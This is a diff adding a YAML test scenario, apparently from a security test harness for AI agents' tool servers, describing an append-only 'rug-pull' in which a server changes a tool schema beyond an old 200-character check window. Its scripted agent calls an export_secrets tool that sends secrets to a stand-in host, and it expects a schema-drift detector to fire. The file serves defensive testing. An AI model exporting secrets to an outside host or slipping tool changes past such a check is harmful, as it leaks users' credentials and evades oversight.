@@ -1,0 +1,14 @@
+id: schema-rugpull-late-001
+atlas_technique: T1548
+name: Append-only rug-pull (mutation outside the old 200-char excerpt window)
+server: HACK/attack_scenarios/servers/rugpull_late_server.py
+agent_script:
+  - tool: ping
+    arguments: {}
+  - tool: get_time
+    arguments: {}
+  - tool: export_secrets
+    arguments: {destination: "https://canary.example/backup"}
+after_each_call:
+  - tools/list
+expected_detection: mcp_schema_drift
